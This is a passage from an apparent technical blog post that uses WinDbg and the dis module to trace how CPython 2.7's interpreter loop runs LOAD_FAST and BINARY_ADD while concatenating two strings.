By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>

<h3>Debugging session: stepping the VM. The hard way.</h3>

<p>It&rsquo;s time for us to go a little bit deeper, at the assembly level, where we belong ; so let&rsquo;s define a dummy function like this one:</p>

<figure class='code'><figcaption><span>dummy function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now using the Python&rsquo;s <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>

<figure class='code'><figcaption><span>disassemble a</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [20]: dis.dis(a)
</span><span class='line'>2   0 LOAD_FAST                0 (b)
</span><span class='line'>    3 LOAD_FAST                1 (c)
</span><span class='line'>    6 BINARY_ADD
</span><span class='line'>    7 RETURN_VALUE
</span><span class='line'>In [21]: a.func_code.co_code
</span><span class='line'>In [22]: print &#39;&#39;.join(&#39;\\x%.2x&#39; % ord(i) for i in a.__code__.co_code)
</span><span class='line'>\x7c\x00\x00\x7c\x01\x00\x17\x53
</span><span class='line'>
</span><span class='line'>In [23]: opcode.opname[0x7c]
</span><span class='line'>Out[23]: &#39;LOAD_FAST&#39;
</span><span class='line'>In [24]: opcode.opname[0x17]
</span><span class='line'>Out[24]: &#39;BINARY_ADD&#39;
</span><span class='line'>In [25]: opcode.opname[0x53]
</span><span class='line'>Out[25]: &#39;RETURN_VALUE&#39;
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>

<figure class='code'><figcaption><span>PyFunctionObject PyCodeObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Bytecode object */</span>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_HEAD</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">co_code</span><span class="p">;</span>    <span class="cm">/* instruction opcodes */</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyCodeObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Time to attach my debugger to the interpreter to see what&rsquo;s going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
Once you did that, you can call the dummy function:</p>

<figure class='code'><figcaption><span>windbg breakpoint</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; bp python27!PyEval_EvalFrameEx+0x2b2 &quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&quot;
</span><span class='line'>breakpoint 0 redefined
</span><span class='line'>0:000&gt; g
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span><span class='line'>
</span><span class='line'>0:000&gt; db ecx l8
</span><span class='line'>025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
</span></code></pre></td></tr></table></div></figure>


<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>

<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>

<p>Here&rsquo;s what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>

<figure class='code'><figcaption><span>fetching the LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span></code></pre></td></tr></table></div></figure>


<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>

<figure class='code'><figcaption><span>LOAD_FAST</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define LOAD_FAST 124 </span><span class="cm">/* Local variable number */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, the function needs to check if the opcode has argument or not, and that&rsquo;s done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>

<figure class='code'><figcaption><span>Checking if the opcode has an argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b8:
</span><span class='line'>1e0ec568 83f85a          cmp     eax,5Ah
</span></code></pre></td></tr></table></div></figure>


<p>Again, we can verify the value to be sure we understand what we are doing:</p>

<figure class='code'><figcaption><span>opcode.HAVE_ARGUMENT</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;5a&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>HAS_ARG</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the opcode has an argument, the function needs to retrieve it (it&rsquo;s one byte):</p>

<figure class='code'><figcaption><span>Fetching the argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2c1:
</span><span class='line'>1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
</span></code></pre></td></tr></table></div></figure>


<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>

<figure class='code'><figcaption><span>LOAD_FAST definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define GETLOCAL(i)     (fastlocals[i])</span>
</span><span class='line'><span class="cp">#define Py_INCREF(op) (                         \</span>
</span><span class='line'><span class="cp">    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \</span>
</span><span class='line'><span class="cp">    ((PyObject*)(op))-&gt;ob_refcnt++)</span>
</span><span class='line'><span class="cp">#define PUSH(v)                BASIC_PUSH(v)</span>
</span><span class='line'><span class="cp">#define BASIC_PUSH(v)     (*stack_pointer++ = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what it looks like in assembly:</p>

<figure class='code'><figcaption><span>Loads the fastlocals array (026bef98)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x31f:
</span><span class='line'>1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
</span></code></pre></td></tr></table></div></figure>


<p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>

<figure class='code'><figcaption><span>Retrieve the entry 0 of the fastlocals array</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Also keep in mind we called our dummy function with two strings, so let&rsquo;s actually check it is a string object:</p>

<figure class='code'><figcaption><span>Type checking</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 025eaaa0 l2
</span><span class='line'>025eaaa0  00000004
</span><span class='line'>025eaaa4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>

<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>    <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We should find the content of the string directly in the object:</p>

<figure class='code'><figcaption><span>Finding the string in the PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; db 025eaaa0 l1f
</span><span class='line'>025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&quot;.......0C
</span><span class='line'>025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
</span></code></pre></td></tr></table></div></figure>


<p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>

<p>Let&rsquo;s move on to the second opcode now, this time with less details though:</p>

<figure class='code'><figcaption><span>Fetching the second LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
</span></code></pre></td></tr></table></div></figure>


<p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
We can type-check the object and dump the string stored in it:</p>

<figure class='code'><figcaption><span>Retrieving the index 1 of fastlocals (025ea9c0)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
</span><span class='line'>0:000&gt; db poi(026bf0d4) l1f
</span><span class='line'>025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&quot;.....9J%)
</span><span class='line'>025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
</span></code></pre></td></tr></table></div></figure>


<p>Comes now the <em>BINARY_ADD</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the BINARY_ADD opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
</span></code></pre></td></tr></table></div></figure>


<p>Here it&rsquo;s supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:</p>

<figure class='code'><figcaption><span>BINARY_ADD</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define SET_TOP(v)        (stack_pointer[-1] = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">BINARY_ADD</span>:
</span><span class='line'>  <span class="n">w</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">v</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>           <span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">string_concatenate</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">next_instr</span><span class="p">);</span>
</span><span class='line'>      <span class="cm">/* string_concatenate consumed the ref to v */</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">skip_decref_vx</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
</span><span class='line'><span class="nl">skip_decref_vx:</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
</span><span class='line'>  <span class="n">SET_TOP</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>

<figure class='code'><figcaption><span>POP and TOP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
</span><span class='line'>eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa45:
</span><span class='line'>1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
</span><span class='line'>...
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4b:
</span><span class='line'>1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4e:
</span><span class='line'>1e0eccfe 83ed04          sub     ebp,4
</span></code></pre></td></tr></table></div></figure>


<p>A bit further we have our string concatenation:</p>

<figure class='code'><figcaption><span>String concatenation in string_concatenate</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x813:
</span><span class='line'>1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
</span><span class='line'>0:000&gt; dd esp l3
</span><span class='line'>0027fcb8  0027fcd0 025eafc0 025eaaa0
</span><span class='line'>0:000&gt; p
</span><span class='line'>eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x818:
</span><span class='line'>1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
</span><span class='line'>0:000&gt; db poi(0027fcd0) l1f
</span><span class='line'>025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&quot;.........
</span><span class='line'>025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
</span></code></pre></td></tr></table></div></figure>


<p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>

<figure class='code'><figcaption><span>Push the resulting object onto the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
</span><span class='line'>python27!PyEval_EvalFrameEx+0x8d2:
</span><span class='line'>1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the RETURN_VALUE opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
